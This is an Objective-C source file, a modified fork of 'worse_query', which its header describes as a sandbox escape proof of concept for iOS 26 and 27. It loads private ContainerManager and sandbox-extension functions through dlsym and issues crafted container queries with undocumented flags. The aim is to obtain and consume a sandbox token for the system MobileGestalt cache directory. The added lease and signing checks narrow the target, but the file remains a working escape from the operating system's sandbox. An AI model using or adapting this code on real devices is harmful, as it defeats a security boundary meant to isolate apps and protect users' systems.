//
//  worse_query.m
//  worse_query
//
//  Created by Taj C on 8/20/26.
//

/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/
// Modified for Locus: scoped leases, signing checks, bounded flag retry,
// serialized queries, and non-destructive workspace restoration (2026-11-10).
// Upstream: forcequitOS/worse_query d1540e20cd82b974d891e0551ced6d6aeb570ac2.

#import "WorseQueryBridge.h"
#import "WorseQueryWorkspace.h"
#import <dlfcn.h>
#import <errno.h>
#import <stdlib.h>
#import <string.h>
#import <sys/stat.h>
#import <xpc/xpc.h>

typedef struct {
    void *library;
    void *(*create)(void);
    void (*setClass)(void *, uint64_t);
    void (*setGroupIdentifiers)(void *, xpc_object_t);
    void (*setFlags)(void *, uint64_t);
    void (*setPart)(void *, uint64_t);
    void *(*getSingleResult)(void *);
    void (*freeQuery)(void *);
    char *(*copySandboxToken)(void *);
    int64_t (*consume)(const char *);
    int (*release)(int64_t);
} WorseQueryAPI;

static WorseQueryAPI *SharedAPI(void)
{
    static WorseQueryAPI api;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        api.library = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
        if (!api.library) return;
#define LOAD(field, symbol) api.field = (__typeof(api.field))dlsym(api.library, symbol)
        LOAD(create, "container_query_create");
        LOAD(setClass, "container_query_set_class");
        LOAD(setGroupIdentifiers, "container_query_set_group_identifiers");
        LOAD(setFlags, "container_query_operation_set_flags");
        LOAD(setPart, "container_query_operation_set_part");
        LOAD(getSingleResult, "container_query_get_single_result");
        LOAD(freeQuery, "container_query_free");
        LOAD(copySandboxToken, "container_copy_sandbox_token");
#undef LOAD
        api.consume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        api.release = dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    });
    return &api;
}

BOOL WorseQueryBridgeAvailable(void)
{
    WorseQueryAPI *a = SharedAPI();
    return a->library && a->create && a->setClass && a->setGroupIdentifiers &&
        a->setFlags && a->setPart && a->getSingleResult && a->freeQuery &&
        a->copySandboxToken && a->consume && a->release;
}

// Prefer actual process entitlements, including re-signing changes. If Security
// task introspection is unavailable, probe only the bundle-derived group using
// FileManager's entitlement-enforcing container API. Never trust unsigned claims.
static NSString *ResolveGroup(NSString **detail)
{
    void *security = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW | RTLD_LOCAL);
    CFTypeRef (*createTask)(CFAllocatorRef) = security ? dlsym(security, "SecTaskCreateFromSelf") : NULL;
    CFTypeRef (*copyValue)(CFTypeRef, CFStringRef, CFErrorRef *) = security ? dlsym(security, "SecTaskCopyValueForEntitlement") : NULL;
    NSArray *groups = nil;
    if (createTask && copyValue) {
        CFTypeRef task = createTask(NULL);
        if (task) {
            CFTypeRef value = copyValue(task, CFSTR("com.apple.security.application-groups"), NULL);
            if (value) {
                id object = CFBridgingRelease(value);
                if ([object isKindOfClass:NSArray.class]) groups = object;
            }
            CFRelease(task);
        }
    }
    if (security) dlclose(security);
    NSString *bundle = NSBundle.mainBundle.bundleIdentifier;
    NSString *preferred = bundle ? [@"group." stringByAppendingString:bundle] : nil;
    if (groups.count == 0) {
        if (preferred && [NSFileManager.defaultManager containerURLForSecurityApplicationGroupIdentifier:preferred]) return preferred;
        if (detail) *detail = @"No accessible signed App Group. Re-sign Locus with com.apple.security.application-groups, group.<current Bundle Identifier>, and an authorized provisioning profile. Security task introspection may be unavailable on this system.";
        return nil;
    }
    // A single group remapped by a sideload signer is also acceptable. Never
    // choose an unrelated group out of an ambiguous multi-group signature.
    NSString *group = preferred && [groups containsObject:preferred] ? preferred :
        (groups.count == 1 && [groups.firstObject isKindOfClass:NSString.class] ? groups.firstObject : nil);
    if (![group hasPrefix:@"group."] || group.length <= 6) {
        if (detail) *detail = @"App Group signing mismatch. Include group.<current Bundle Identifier>, or sign with one dedicated App Group.";
        return nil;
    }
    if (![NSFileManager.defaultManager containerURLForSecurityApplicationGroupIdentifier:group]) {
        if (detail) *detail = [NSString stringWithFormat:@"Signed App Group %@ has no accessible container. Check the provisioning profile and App Group registration.", group];
        return nil;
    }
    return group;
}

NSString *WorseQueryAccessConfigurationError(void)
{
    if (!WorseQueryBridgeAvailable()) return @"worse_query ContainerManager or sandbox extension API unavailable.";
    NSString *detail = nil;
    return ResolveGroup(&detail) ? nil : detail;
}

@interface WorseQueryGrant : NSObject
@property(nonatomic) int64_t handle;
@property(nonatomic) NSUInteger users;
@end
@implementation WorseQueryGrant
@end

static NSMutableDictionary<NSString *, WorseQueryGrant *> *Grants(void)
{
    static NSMutableDictionary *grants;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ grants = [NSMutableDictionary dictionary]; });
    return grants;
}

// Caller holds the same process-wide lock as lease acquisition/release.
static int64_t Acquire(NSString *target, NSString *group, NSString **detail)
{
    // Preserve upstream create_dir=false: never create a system target.
    struct stat targetStat;
    if (lstat(target.fileSystemRepresentation, &targetStat) != 0 ||
        (!S_ISDIR(targetStat.st_mode) && !S_ISREG(targetStat.st_mode))) {
        if (detail) *detail = @"worse_query target is missing, inaccessible, or not a regular file/directory.";
        return -1;
    }
    NSFileManager *files = NSFileManager.defaultManager;
    NSURL *root = [files containerURLForSecurityApplicationGroupIdentifier:group];
    if (!root) { if (detail) *detail = @"App Group container became unavailable."; return -1; }
    NSURL *library = [root URLByAppendingPathComponent:@"Library" isDirectory:YES];
    if (![files createDirectoryAtURL:library withIntermediateDirectories:YES attributes:nil error:NULL]) {
        if (detail) *detail = @"Could not prepare the App Group Library directory.";
        return -1;
    }
    WorseQueryAPI *a = SharedAPI();
    // Both flag variants are from upstream. Retry rejection/token failures once.
    const uint64_t flags[] = { 0x0000008000000000ULL, 0x0000000800000000ULL };
    for (NSUInteger attempt = 0; attempt < 2; attempt++) {
        void *query = a->create();
        if (!query) {
            if (detail) *detail = @"worse_query could not create a ContainerManager query.";
            return -1;
        }
        a->setClass(query, 7);
        xpc_object_t identifier = xpc_string_create(group.UTF8String);
        a->setGroupIdentifiers(query, identifier);
#if !OS_OBJECT_USE_OBJC
        xpc_release(identifier);
#endif
        a->setPart(query, 3);
        a->setFlags(query, flags[attempt]);
        LocusQueryWorkspace workspace;
        int preparation = LocusQueryWorkspaceBegin(library.fileSystemRepresentation, target.fileSystemRepresentation, &workspace);
        if (preparation) {
            a->freeQuery(query);
            if (detail) *detail = [NSString stringWithFormat:@"worse_query workspace refused (%s). Existing App Group data was preserved. Keep Library/.locus-worse-query-caches for recovery if present.", strerror(preparation)];
            return -1;
        }
        void *result = a->getSingleResult(query);
        char *token = result ? a->copySandboxToken(result) : NULL;
        int64_t handle = token ? a->consume(token) : -1;
        free(token);
        a->freeQuery(query);
        int cleanup = LocusQueryWorkspaceEnd(&workspace, target.fileSystemRepresentation);
        if (cleanup) {
            if (handle >= 0 && a->release(handle) != 0) {
                // Keep failed releases for retry before any new grant.
                WorseQueryGrant *pending = [WorseQueryGrant new];
                pending.handle = handle;
                Grants()[target] = pending;
            }
            if (detail) *detail = [NSString stringWithFormat:@"worse_query workspace restoration failed (%s). Inspect the preserved App Group Library before retrying.", strerror(cleanup)];
            return -1;
        }
        if (handle >= 0) return handle;
    }
    if (detail) *detail = @"worse_query access denied with both query flags. Check App Group signing and device support.";
    return -1;
}

@interface WorseQueryLease ()
@property(nonatomic, copy, readwrite) NSString *targetPath;
@property(nonatomic, readwrite, getter=isActive) BOOL active;
@end

@implementation WorseQueryLease
@synthesize active = _active;

- (BOOL)isActive
{
    @synchronized (WorseQueryLease.class) { return _active; }
}

+ (instancetype)leaseForPath:(NSString *)path error:(NSString **)error
{
    @synchronized (WorseQueryLease.class) {
        if (!path.isAbsolutePath || [path rangeOfCharacterFromSet:NSCharacterSet.controlCharacterSet].location != NSNotFound) {
            if (error) *error = @"worse_query requires an absolute target path without control characters.";
            return nil;
        }
        NSString *normalized = path.stringByStandardizingPath;
        if ([normalized hasPrefix:@"/private/var/"]) normalized = [normalized substringFromIndex:8];
        if (![normalized isEqualToString:@"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches"]) {
            if (error) *error = @"worse_query target is outside Locus's fixed MobileGestalt cache directory.";
            return nil;
        }
        WorseQueryGrant *grant = Grants()[normalized];
        if (grant && grant.users == 0) {
            if (SharedAPI()->release(grant.handle) != 0) {
                if (error) *error = @"A previous worse_query handle could not be released. Retry later.";
                return nil;
            }
            [Grants() removeObjectForKey:normalized];
            grant = nil;
        }
        if (!grant) {
            NSString *detail = nil;
            if (!WorseQueryBridgeAvailable()) {
                if (error) *error = @"worse_query ContainerManager or sandbox extension API unavailable.";
                return nil;
            }
            NSString *group = ResolveGroup(&detail);
            int64_t handle = group ? Acquire(normalized, group, &detail) : -1;
            if (handle < 0) { if (error) *error = detail; return nil; }
            grant = [WorseQueryGrant new];
            grant.handle = handle;
            Grants()[normalized] = grant;
        }
        grant.users++;
        WorseQueryLease *lease = [WorseQueryLease new];
        lease.targetPath = normalized;
        lease.active = YES;
        if (error) *error = nil;
        return lease;
    }
}
- (void)invalidate
{
    @synchronized (WorseQueryLease.class) {
        if (!_active) return;
        WorseQueryGrant *grant = Grants()[_targetPath];
        // A failed release stays tracked with zero users and is retried before
        // the next acquisition. Each lease returns its reference exactly once.
        if (grant && --grant.users == 0 && SharedAPI()->release(grant.handle) == 0)
            [Grants() removeObjectForKey:_targetPath];
        _active = NO;
    }
}
- (void)dealloc { [self invalidate]; }
@end
